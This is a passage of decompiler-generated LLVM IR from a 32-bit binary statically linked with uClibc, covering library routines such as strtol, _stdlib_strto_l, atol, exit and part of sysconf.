  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804b417 = inttoptr i32 %v0_804b412 to i32*
  %v3_804b417 = call i32 @srandom_r(i32 %arg1, i32* %v2_804b417)
  %v0_804b41c = load i32, i32* @ebp, align 4
  %v1_804b41c = inttoptr i32 %v0_804b41c to i32*
  store i32 0, i32* %v1_804b41c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b427 = load i32, i32* @ebx, align 4
  %v1_804b427 = icmp eq i32 %v0_804b427, 0
  br i1 %v1_804b427, label %dec_label_pc_804b458, label %dec_label_pc_804b42b

dec_label_pc_804b42b:                             ; preds = %dec_label_pc_804b3ef
  %v0_804b42b = load i32, i32* @edi, align 4
  %v1_804b42b = add i32 %v0_804b42b, 4
  %v2_804b42b = inttoptr i32 %v1_804b42b to i32*
  %v3_804b42b = load i32, i32* %v2_804b42b, align 4
  %v1_804b42e = load i32, i32* @esi, align 4
  %v2_804b42e = sub i32 %v3_804b42b, %v1_804b42e
  %v2_804b430 = sdiv i32 %v2_804b42e, 4
  %v3_804b433 = mul i32 %v2_804b430, 5
  %v2_804b436 = add i32 %v3_804b433, %v0_804b427
  %v1_804b438 = load i32, i32* @ebp, align 4
  %v2_804b438 = inttoptr i32 %v1_804b438 to i32*
  store i32 %v2_804b436, i32* %v2_804b438, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b458

dec_label_pc_804b43f:                             ; preds = %dec_label_pc_804b3de
  %v1_804b43f = call i32 @__errno_location(i32 %v0_804b3b8)
  store i32 %v1_804b43f, i32* %eax.global-to-local, align 4
  %v1_804b444 = inttoptr i32 %v1_804b43f to i32*
  store i32 22, i32* %v1_804b444, align 4
  %v0_804b44a = load i32, i32* %stack_var_-36, align 4
  %v1_804b44a = call i32 @__errno_location(i32 %v0_804b44a)
  %v1_804b44f = inttoptr i32 %v1_804b44a to i32*
  store i32 22, i32* %v1_804b44f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b458

dec_label_pc_804b458:                             ; preds = %dec_label_pc_804b3ef, %dec_label_pc_804b42b, %dec_label_pc_804b43f
  %v0_804b45f = phi i32 [ 0, %dec_label_pc_804b3ef ], [ 0, %dec_label_pc_804b42b ], [ -1, %dec_label_pc_804b43f ]
  store i32 %v0_804b3b7, i32* @esi, align 4
  ret i32 %v0_804b45f

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b458, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3ef, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804b46b = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804b46b
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804b485 = inttoptr i32 %arg1 to i8*
  %v5_804b485 = call i32 @_stdlib_strto_l(i8* %v4_804b485, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804b485
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b493 = load i32, i32* @ebx, align 4
  store i32 %v0_804b493, i32* %stack_var_-16, align 4
  %v4_804b497 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b497, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_804b49f = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804b49f, i32* %edx.global-to-local, align 4
  store i32 %v4_804b497, i32* %ebx.global-to-local, align 4
  %v2_804b4aa40 = load i8, i8* %arg1, align 1
  %v3_804b4aa41 = sext i8 %v2_804b4aa40 to i32
  store i32 %v3_804b4aa41, i32* %eax.global-to-local, align 4
  %v2_804b4ad42 = mul nsw i32 %v3_804b4aa41, 2
  %v3_804b4ad43 = add i32 %v2_804b4ad42, %v0_804b49f
  %v4_804b4ad44 = inttoptr i32 %v3_804b4ad43 to i8*
  %v5_804b4ad45 = load i8, i8* %v4_804b4ad44, align 1
  %v6_804b4ad46 = and i8 %v5_804b4ad45, 32
  %v7_804b4ad47 = icmp eq i8 %v6_804b4ad46, 0
  %v1_804b4b148 = icmp eq i1 %v7_804b4ad47, false
  br i1 %v1_804b4b148, label %dec_label_pc_804b4a9, label %dec_label_pc_804b4b3

dec_label_pc_804b4a9:                             ; preds = %entry, %dec_label_pc_804b4a9
  %v0_804b4a949 = phi i32 [ %v1_804b4a9, %dec_label_pc_804b4a9 ], [ %v4_804b497, %entry ]
  %v1_804b4a9 = add i32 %v0_804b4a949, 1
  store i32 %v1_804b4a9, i32* %ebx.global-to-local, align 4
  %v1_804b4aa = inttoptr i32 %v1_804b4a9 to i8*
  %v2_804b4aa = load i8, i8* %v1_804b4aa, align 1
  %v3_804b4aa = sext i8 %v2_804b4aa to i32
  store i32 %v3_804b4aa, i32* %eax.global-to-local, align 4
  %v2_804b4ad = mul nsw i32 %v3_804b4aa, 2
  %v3_804b4ad = add i32 %v2_804b4ad, %v0_804b49f
  %v4_804b4ad = inttoptr i32 %v3_804b4ad to i8*
  %v5_804b4ad = load i8, i8* %v4_804b4ad, align 1
  %v6_804b4ad = and i8 %v5_804b4ad, 32
  %v7_804b4ad = icmp eq i8 %v6_804b4ad, 0
  %v1_804b4b1 = icmp eq i1 %v7_804b4ad, false
  br i1 %v1_804b4b1, label %dec_label_pc_804b4a9, label %dec_label_pc_804b4b3

dec_label_pc_804b4b3:                             ; preds = %dec_label_pc_804b4a9, %entry
  %v0_804b4a9.lcssa = phi i32 [ %v4_804b497, %entry ], [ %v1_804b4a9, %dec_label_pc_804b4a9 ]
  %v2_804b4aa.lcssa = phi i8 [ %v2_804b4aa40, %entry ], [ %v2_804b4aa, %dec_label_pc_804b4a9 ]
  %v3_804b4aa.lcssa = phi i32 [ %v3_804b4aa41, %entry ], [ %v3_804b4aa, %dec_label_pc_804b4a9 ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_804b4b3 = icmp eq i8 %v2_804b4aa.lcssa, 43
  br i1 %v9_804b4b3, label %dec_label_pc_804b4ce, label %dec_label_pc_804b4b8

dec_label_pc_804b4b8:                             ; preds = %dec_label_pc_804b4b3
  %v9_804b4b8 = icmp eq i8 %v2_804b4aa.lcssa, 45
  %v1_804b4c0 = icmp eq i1 %v9_804b4b8, false
  br i1 %v1_804b4c0, label %dec_label_pc_804b4cf, label %dec_label_pc_804b4ce

dec_label_pc_804b4ce:                             ; preds = %dec_label_pc_804b4b3, %dec_label_pc_804b4b8
  %storemerge4 = phi i8 [ 1, %dec_label_pc_804b4b8 ], [ 0, %dec_label_pc_804b4b3 ]
  %v1_804b4ce = add i32 %v0_804b4a9.lcssa, 1
  store i32 %v1_804b4ce, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b4cf

dec_label_pc_804b4cf:                             ; preds = %dec_label_pc_804b4b8, %dec_label_pc_804b4ce
  %v0_804b4e1 = phi i32 [ %v1_804b4ce, %dec_label_pc_804b4ce ], [ %v0_804b4a9.lcssa, %dec_label_pc_804b4b8 ]
  %stack_var_-18.0 = phi i8 [ %storemerge4, %dec_label_pc_804b4ce ], [ 0, %dec_label_pc_804b4b8 ]
  %v1_804b4cf = and i32 %arg3, -17
  %v2_804b4cf = icmp eq i32 %v1_804b4cf, 0
  %v1_804b4d7 = icmp eq i1 %v2_804b4cf, false
  br i1 %v1_804b4d7, label %dec_label_pc_804b4fd, label %dec_label_pc_804b4d9

dec_label_pc_804b4d9:                             ; preds = %dec_label_pc_804b4cf
  %v1_804b4d9 = add i32 %arg3, 10
  store i32 %v1_804b4d9, i32* %esi.global-to-local, align 4
  %v1_804b4dc = inttoptr i32 %v0_804b4e1 to i8*
  %v2_804b4dc = load i8, i8* %v1_804b4dc, align 1
  %v8_804b4dc = icmp eq i8 %v2_804b4dc, 48
  %v1_804b4df = icmp eq i1 %v8_804b4dc, false
  br i1 %v1_804b4df, label %dec_label_pc_804b4f2, label %dec_label_pc_804b4e1

dec_label_pc_804b4e1:                             ; preds = %dec_label_pc_804b4d9
  %v1_804b4e1 = add i32 %v0_804b4e1, 1
  store i32 %v1_804b4e1, i32* %ebx.global-to-local, align 4
  %v1_804b4e2 = add i32 %arg3, 8
  store i32 %v1_804b4e2, i32* %esi.global-to-local, align 4
  %v1_804b4e5 = inttoptr i32 %v1_804b4e1 to i8*
  %v2_804b4e5 = load i8, i8* %v1_804b4e5, align 1
  %v2_804b4e9 = or i8 %v2_804b4e5, 32
  %v7_804b4e9 = zext i8 %v2_804b4e9 to i32
  %v9_804b4e9 = and i32 %v3_804b4aa.lcssa, -256
  %v10_804b4e9 = or i32 %v7_804b4e9, %v9_804b4e9
  store i32 %v10_804b4e9, i32* %eax.global-to-local, align 4
  %v10_804b4eb = icmp eq i8 %v2_804b4e9, 120
  %v1_804b4ed = icmp eq i1 %v10_804b4eb, false
  br i1 %v1_804b4ed, label %dec_label_pc_804b4f2, label %dec_label_pc_804b4ef

dec_label_pc_804b4ef:                             ; preds = %dec_label_pc_804b4e1
  %v2_804b4ef = mul i32 %v1_804b4e2, 2
  store i32 %v2_804b4ef, i32* %esi.global-to-local, align 4
  %v1_804b4f1 = add i32 %v0_804b4e1, 2
  store i32 %v1_804b4f1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b4f2

dec_label_pc_804b4f2:                             ; preds = %dec_label_pc_804b4e1, %dec_label_pc_804b4d9, %dec_label_pc_804b4ef
  %v0_804b51a12 = phi i32 [ %v1_804b4e1, %dec_label_pc_804b4e1 ], [ %v0_804b4e1, %dec_label_pc_804b4d9 ], [ %v1_804b4f1, %dec_label_pc_804b4ef ]
  %v0_804b57421 = phi i32 [ %v1_804b4e1, %dec_label_pc_804b4e1 ], [ %v4_804b497, %dec_label_pc_804b4d9 ], [ %v1_804b4e1, %dec_label_pc_804b4ef ]
  %v3_804b4fa = phi i32 [ %v1_804b4e2, %dec_label_pc_804b4e1 ], [ %v1_804b4d9, %dec_label_pc_804b4d9 ], [ %v2_804b4ef, %dec_label_pc_804b4ef ]
  %v1_804b4f2 = add i32 %v3_804b4fa, -17
  %v6_804b4f2 = sub i32 16, %v3_804b4fa
  %v7_804b4f2 = and i32 %v6_804b4f2, %v3_804b4fa
  %v8_804b4f2 = icmp slt i32 %v7_804b4f2, 0
  %v10_804b4f2 = icmp slt i32 %v1_804b4f2, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_804b4fa = icmp eq i1 %v10_804b4f2, %v8_804b4f2
  %v5_804b4fa = select i1 %v2_804b4fa, i32 16, i32 %v3_804b4fa
  store i32 %v5_804b4fa, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b4fd

dec_label_pc_804b4fd:                             ; preds = %dec_label_pc_804b4cf, %dec_label_pc_804b4f2
  %v0_804b57422 = phi i32 [ %v4_804b497, %dec_label_pc_804b4cf ], [ %v0_804b57421, %dec_label_pc_804b4f2 ]
  %v0_804b51a11 = phi i32 [ %v0_804b4e1, %dec_label_pc_804b4cf ], [ %v0_804b51a12, %dec_label_pc_804b4f2 ]
  %v0_804b50c = phi i32 [ %arg3, %dec_label_pc_804b4cf ], [ %v5_804b4fa, %dec_label_pc_804b4f2 ]
  %v1_804b4fd = add i32 %v0_804b50c, -2
  store i32 %v1_804b4fd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804b505 = icmp ugt i32 %v1_804b4fd, 34
  br i1 %v6_804b505, label %dec_label_pc_804b569, label %dec_label_pc_804b507

dec_label_pc_804b507:                             ; preds = %dec_label_pc_804b4fd
  %div = udiv i32 -1, %v0_804b50c
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_804b50c
  %v1_804b50e = trunc i32 %tmp37 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804b547 = urem i32 %arg4, 256
  br label %dec_label_pc_804b51a

dec_label_pc_804b518:                             ; preds = %dec_label_pc_804b55f, %dec_label_pc_804b547
  %v2_804b51c.pre = phi i32 [ %v0_804b562, %dec_label_pc_804b55f ], [ %v2_804b51c.pre.pre, %dec_label_pc_804b547 ]
  %v4_804b51a.pre = phi i32 [ %v1_804b533, %dec_label_pc_804b55f ], [ %v4_804b51a.pre.pre, %dec_label_pc_804b547 ]
  %v0_804b518 = phi i32 [ %v1_804b53a, %dec_label_pc_804b55f ], [ %v0_804b518.pre, %dec_label_pc_804b547 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_804b55f ], [ %v6_804b54b, %dec_label_pc_804b547 ]
  br label %dec_label_pc_804b51a

dec_label_pc_804b51a:                             ; preds = %dec_label_pc_804b507, %dec_label_pc_804b518
  %v0_804b57420 = phi i32 [ %v0_804b57422, %dec_label_pc_804b507 ], [ %v0_804b518, %dec_label_pc_804b518 ]
  %v0_804b53a = phi i32 [ %v0_804b51a11, %dec_label_pc_804b507 ], [ %v0_804b518, %dec_label_pc_804b518 ]
  %v2_804b51c = phi i32 [ %v4_804b497, %dec_label_pc_804b507 ], [ %v2_804b51c.pre, %dec_label_pc_804b518 ]
  %v4_804b51a = phi i32 [ %div, %dec_label_pc_804b507 ], [ %v4_804b51a.pre, %dec_label_pc_804b518 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804b507 ], [ %stack_var_-18.1, %dec_label_pc_804b518 ]
  %v1_804b51a = inttoptr i32 %v0_804b53a to i8*
  %v2_804b51a = load i8, i8* %v1_804b51a, align 1
  %v3_804b51a = zext i8 %v2_804b51a to i32
  %v5_804b51a = and i32 %v4_804b51a, -256
  %v6_804b51a = or i32 %v3_804b51a, %v5_804b51a
  store i32 %v6_804b51a, i32* %eax.global-to-local, align 4
  %v2_804b51e = add i8 %v2_804b51a, -48
  %v12_804b51e = zext i8 %v2_804b51e to i32
  %v14_804b51e = and i32 %v2_804b51c, -256
  %v15_804b51e = or i32 %v12_804b51e, %v14_804b51e
  store i32 %v15_804b51e, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_804b51e, 10
  br i1 %tmp, label %dec_label_pc_804b533, label %dec_label_pc_804b526

dec_label_pc_804b526:                             ; preds = %dec_label_pc_804b51a
  %v2_804b526 = or i8 %v2_804b51a, 32
  %v7_804b526 = zext i8 %v2_804b526 to i32
  %v10_804b526 = or i32 %v7_804b526, %v5_804b51a
  store i32 %v10_804b526, i32* %eax.global-to-local, align 4
  %v2_804b528 = or i32 %v14_804b51e, 40
  store i32 %v2_804b528, i32* @ecx, align 4
  %tmp54 = icmp ult i8 %v2_804b526, 97
  br i1 %tmp54, label %dec_label_pc_804b533, label %dec_label_pc_804b52e

dec_label_pc_804b52e:                             ; preds = %dec_label_pc_804b526
  %v2_804b530 = add i8 %v2_804b526, -87
  %v15_804b530 = zext i8 %v2_804b530 to i32
  %v18_804b530 = or i32 %v15_804b530, %v14_804b51e
  store i32 %v18_804b530, i32* @ecx, align 4
  br label %dec_label_pc_804b533

dec_label_pc_804b533:                             ; preds = %dec_label_pc_804b526, %dec_label_pc_804b51a, %dec_label_pc_804b52e
  %v0_804b562 = phi i32 [ %v2_804b528, %dec_label_pc_804b526 ], [ %v15_804b51e, %dec_label_pc_804b51a ], [ %v18_804b530, %dec_label_pc_804b52e ]
  %v1_804b533 = urem i32 %v0_804b562, 256
  store i32 %v1_804b533, i32* %eax.global-to-local, align 4
  %v1_804b536 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b536 = sub i32 %v1_804b533, %v1_804b536
  %v10_804b536 = and i32 %v2_804b536, %v1_804b536
  %v11_804b536 = icmp slt i32 %v10_804b536, 0
  %v13_804b536 = icmp slt i32 %v2_804b536, 0
  %v2_804b538 = icmp eq i1 %v13_804b536, %v11_804b536
  br i1 %v2_804b538, label %dec_label_pc_804b569, label %dec_label_pc_804b53a

dec_label_pc_804b53a:                             ; preds = %dec_label_pc_804b533
  %v1_804b53a = add i32 %v0_804b53a, 1
  store i32 %v1_804b53a, i32* %ebx.global-to-local, align 4
  %v0_804b53b = load i32, i32* %edx.global-to-local, align 4
  %v1_804b53b = load i32, i32* %ebp.global-to-local, align 4
  %tmp55 = icmp ugt i32 %v0_804b53b, %v1_804b53b
  br i1 %tmp55, label %dec_label_pc_804b547, label %dec_label_pc_804b53f

dec_label_pc_804b53f:                             ; preds = %dec_label_pc_804b53a
  %v12_804b53b = icmp eq i32 %v0_804b53b, %v1_804b53b
  %v1_804b53f = icmp eq i1 %v12_804b53b, false
  br i1 %v1_804b53f, label %dec_label_pc_804b55f, label %dec_label_pc_804b541

dec_label_pc_804b541:                             ; preds = %dec_label_pc_804b53f
  %v1_804b541 = trunc i32 %v0_804b562 to i8
  %tmp56 = icmp ugt i8 %v1_804b541, %v1_804b50e
  br i1 %tmp56, label %dec_label_pc_804b547, label %dec_label_pc_804b55f

dec_label_pc_804b547:                             ; preds = %dec_label_pc_804b541, %dec_label_pc_804b53a
  store i32 %v4_804b547, i32* %eax.global-to-local, align 4
  %v6_804b54b = and i8 %stack_var_-18.2, %tmp36
  %v1_804b54f = sext i8 %v6_804b54b to i32
  %v2_804b54f = call i32 @__errno_location(i32 %v1_804b54f)
  store i32 %v2_804b54f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804b557 = inttoptr i32 %v2_804b54f to i32*
  store i32 34, i32* %v1_804b557, align 4
  %v0_804b518.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804b51a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804b51c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804b518

dec_label_pc_804b55f:                             ; preds = %dec_label_pc_804b541, %dec_label_pc_804b53f
  %v4_804b55f = mul i32 %v0_804b53b, %v1_804b536
  store i32 %v1_804b533, i32* %eax.global-to-local, align 4
  %v2_804b565 = add i32 %v4_804b55f, %v1_804b533
  store i32 %v2_804b565, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b518

dec_label_pc_804b569:                             ; preds = %dec_label_pc_804b533, %dec_label_pc_804b4fd
  %v0_804b574 = phi i32 [ %v0_804b57422, %dec_label_pc_804b4fd ], [ %v0_804b57420, %dec_label_pc_804b533 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804b4fd ], [ %stack_var_-18.2, %dec_label_pc_804b533 ]
  %v4_804b569 = icmp eq i32 %arg2, 0
  br i1 %v4_804b569, label %dec_label_pc_804b576, label %dec_label_pc_804b570

dec_label_pc_804b570:                             ; preds = %dec_label_pc_804b569
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b574 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804b574, i32* %v2_804b574, align 4
  br label %dec_label_pc_804b576

dec_label_pc_804b576:                             ; preds = %dec_label_pc_804b569, %dec_label_pc_804b570
  %v8_804b576 = icmp eq i8 %stack_var_-18.3, 0
  %v2_804b57b = zext i1 %v8_804b576 to i32
  %v13_804b57b = icmp eq i1 %v8_804b576, false
  %v1_804b57d2 = or i32 %v2_804b57b, -2147483648
  store i32 %v1_804b57d2, i32* %ebx.global-to-local, align 4
  %v5_804b583 = icmp eq i8 %tmp36, 0
  br i1 %v5_804b583, label %dec_label_pc_804b59b, label %dec_label_pc_804b58a

dec_label_pc_804b58a:                             ; preds = %dec_label_pc_804b576
  %v0_804b58a = load i32, i32* %edx.global-to-local, align 4
  %tmp57 = icmp ugt i32 %v0_804b58a, %v1_804b57d2
  br i1 %tmp57, label %dec_label_pc_804b58e, label %dec_label_pc_804b59b

dec_label_pc_804b58e:                             ; preds = %dec_label_pc_804b58a
  %v1_804b58e = sext i8 %stack_var_-18.3 to i32
  %v2_804b58e = call i32 @__errno_location(i32 %v1_804b58e)
  store i32 %v2_804b58e, i32* %eax.global-to-local, align 4
  %v0_804b593 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b593, i32* %edx.global-to-local, align 4
  %v1_804b595 = inttoptr i32 %v2_804b58e to i32*
  store i32 34, i32* %v1_804b595, align 4
  br label %dec_label_pc_804b59b

dec_label_pc_804b59b:                             ; preds = %dec_label_pc_804b58a, %dec_label_pc_804b576, %dec_label_pc_804b58e
  %v0_804b59b = load i32, i32* %edx.global-to-local, align 4
  %v1_804b59d = sub i32 0, %v0_804b59b
  %v4_804b5a4 = select i1 %v13_804b57b, i32 %v1_804b59d, i32 %v0_804b59b
  store i32 %v4_804b5a4, i32* @edx, align 4
  %v2_804b5aa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b5aa, i32* @ebx, align 4
  store i32 %v4_804b5a4, i32* %eax.global-to-local, align 4
  ret i32 %v4_804b5a4

; uselistorder directives
  uselistorder i32 %v4_804b5a4, { 1, 0, 2 }
  uselistorder i1 %v8_804b576, { 1, 0 }
  uselistorder i8 %v6_804b54b, { 1, 0 }
  uselistorder i32 %v1_804b53b, { 1, 0 }
  uselistorder i32 %v0_804b53b, { 2, 1, 0 }
  uselistorder i32 %v1_804b53a, { 1, 0 }
  uselistorder i32 %v2_804b536, { 1, 0 }
  uselistorder i32 %v1_804b533, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804b562, { 2, 0, 1 }
  uselistorder i8 %v2_804b526, { 1, 0, 2 }
  uselistorder i32 %v14_804b51e, { 0, 2, 1 }
  uselistorder i32 %v0_804b518, { 1, 0 }
  uselistorder i32 %v0_804b50c, { 1, 0, 2 }
  uselistorder i32 %v3_804b4fa, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b4ef, { 1, 0 }
  uselistorder i32 %v1_804b4e2, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_804b4e1, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp36, { 1, 0 }
  uselistorder i8 %v2_804b4aa.lcssa, { 1, 0 }
  uselistorder i32 %v0_804b4a9.lcssa, { 1, 0 }
  uselistorder i32 %v1_804b4a9, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804b49f, { 1, 0, 2 }
  uselistorder i32 %v4_804b497, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b59b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b576, { 1, 0 }
  uselistorder label %dec_label_pc_804b533, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b51a, { 1, 0 }
  uselistorder label %dec_label_pc_804b4fd, { 1, 0 }
  uselistorder label %dec_label_pc_804b4f2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b4cf, { 1, 0 }
  uselistorder label %dec_label_pc_804b4ce, { 1, 0 }
  uselistorder label %dec_label_pc_804b4a9, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804b5c7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b5c7, i32* @ebx, align 4
  %v2_804b5cc = call i32 @__pthread_return_void(i32 %v2_804b5c7, i32 134526883)
  %v1_804b5d8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052140.66 to i32))
  %v0_804b5dd = load i32, i32* @global_var_8052504.67, align 4
  store i32 %v0_804b5dd, i32* @eax, align 4
  %v1_804b5e5 = icmp eq i32 %v0_804b5dd, 0
  br i1 %v1_804b5e5, label %dec_label_pc_804b5f2, label %dec_label_pc_804b5e9

dec_label_pc_804b5e9:                             ; preds = %entry
  %v0_804b5ec = load i32, i32* @esi, align 4
  %v1_804b5ed = call i32 @unknown_0(i32 %v0_804b5ec)
  store i32 %v1_804b5ed, i32* @eax, align 4
  br label %dec_label_pc_804b5f2

dec_label_pc_804b5f2:                             ; preds = %entry, %dec_label_pc_804b5e9
  %v2_804b5f7 = call i32 @__pthread_return_void(i32 %v2_804b5c7, i32 1)
  %v0_804b5fc = call i32 @__GI___uClibc_fini()
  %v0_804b60d = call i32 @_stdio_term()
  %v0_804b615 = load i32, i32* @esi, align 4
  %v1_804b616 = call i32 @__GI__exit(i32 %v0_804b615)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_804b5f2, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_804b63b [
    i32 0, label %dec_label_pc_804b64b
    i32 1, label %dec_label_pc_804b730
    i32 2, label %dec_label_pc_804b655
    i32 3, label %dec_label_pc_804b65f
    i32 4, label %dec_label_pc_804b669
    i32 5, label %dec_label_pc_804b6ff
    i32 6, label %dec_label_pc_804b671
    i32 7, label %dec_label_pc_804b631
    i32 8, label %dec_label_pc_804b631
    i32 9, label %dec_label_pc_804b631
    i32 10, label %dec_label_pc_804b631
    i32 11, label %dec_label_pc_804b631
    i32 12, label %dec_label_pc_804b631
    i32 13, label %dec_label_pc_804b631
    i32 14, label %dec_label_pc_804b631
    i32 15, label %dec_label_pc_804b631
    i32 16, label %dec_label_pc_804b631
    i32 17, label %dec_label_pc_804b631
    i32 18, label %dec_label_pc_804b631
    i32 19, label %dec_label_pc_804b631
    i32 20, label %dec_label_pc_804b631
    i32 21, label %dec_label_pc_804b631
    i32 22, label %dec_label_pc_804b631
    i32 23, label %dec_label_pc_804b730
    i32 24, label %dec_label_pc_804b730
    i32 25, label %dec_label_pc_804b73c
    i32 26, label %dec_label_pc_804b70d
    i32 27, label %dec_label_pc_804b730
    i32 28, label %dec_label_pc_804b683
    i32 29, label %dec_label_pc_804b706
    i32 30, label %dec_label_pc_804b67b
    i32 31, label %dec_label_pc_804b71b
    i32 32, label %dec_label_pc_804b730
    i32 33, label %dec_label_pc_804b730
    i32 34, label %dec_label_pc_804b730
    i32 35, label %dec_label_pc_804b714
    i32 36, label %dec_label_pc_804b743
    i32 37, label %dec_label_pc_804b74a
    i32 38, label %dec_label_pc_804b743
    i32 39, label %dec_label_pc_804b68d
    i32 40, label %dec_label_pc_804b751
    i32 41, label %dec_label_pc_804b730
    i32 42, label %dec_label_pc_804b71b
    i32 43, label %dec_label_pc_804b74a
    i32 44, label %dec_label_pc_804b758
    i32 45, label %dec_label_pc_804b74a
    i32 46, label %dec_label_pc_804b706
    i32 47, label %dec_label_pc_804b706
    i32 48, label %dec_label_pc_804b706
    i32 49, label %dec_label_pc_804b730
    i32 50, label %dec_label_pc_804b730
    i32 51, label %dec_label_pc_804b706
    i32 52, label %dec_label_pc_804b706
    i32 53, label %dec_label_pc_804b730
    i32 54, label %dec_label_pc_804b730
    i32 55, label %dec_label_pc_804b730
    i32 56, label %dec_label_pc_804b730
    i32 57, label %dec_label_pc_804b730
    i32 58, label %dec_label_pc_804b730
    i32 59, label %dec_label_pc_804b730
    i32 60, label %dec_label_pc_804b730
    i32 61, label %dec_label_pc_804b730
    i32 62, label %dec_label_pc_804b730
    i32 63, label %dec_label_pc_804b730
    i32 64, label %dec_label_pc_804b730
    i32 65, label %dec_label_pc_804b730
    i32 66, label %dec_label_pc_804b730
    i32 67, label %dec_label_pc_804b631
    i32 68, label %dec_label_pc_804b631
    i32 69, label %dec_label_pc_804b714
    i32 70, label %dec_label_pc_804b714
    i32 71, label %dec_label_pc_804b714
    i32 72, label %dec_label_pc_804b71b
    i32 73, label %dec_label_pc_804b722
    i32 74, label %dec_label_pc_804b729
    i32 75, label %dec_label_pc_804b697
    i32 76, label %dec_label_pc_804b729
    i32 77, label %dec_label_pc_804b631
    i32 78, label %dec_label_pc_804b631
    i32 79, label %dec_label_pc_804b631
    i32 80, label %dec_label_pc_804b631
    i32 81, label %dec_label_pc_804b631
    i32 82, label %dec_label_pc_804b631
    i32 83, label %dec_label_pc_804b631
    i32 84, label %dec_label_pc_804b631
    i32 85, label %dec_label_pc_804b730
    i32 86, label %dec_label_pc_804b730
    i32 87, label %dec_label_pc_804b70d
    i32 88, label %dec_label_pc_804b6a1
    i32 89, label %dec_label_pc_804b6ab
    i32 90, label %dec_label_pc_804b722
    i32 91, label %dec_label_pc_804b631
    i32 92, label %dec_label_pc_804b631
    i32 93, label %dec_label_pc_804b631
    i32 94, label %dec_label_pc_804b631
    i32 95, label %dec_label_pc_804b706
    i32 96, label %dec_label_pc_804b730
    i32 97, label %dec_label_pc_804b730
    i32 98, label %dec_label_pc_804b631
    i32 99, label %dec_label_pc_804b631
    i32 100, label %dec_label_pc_804b631
    i32 101, label %dec_label_pc_804b6b5
    i32 102, label %dec_label_pc_804b6f8
    i32 103, label %dec_label_pc_804b735
    i32 104, label %dec_label_pc_804b70d
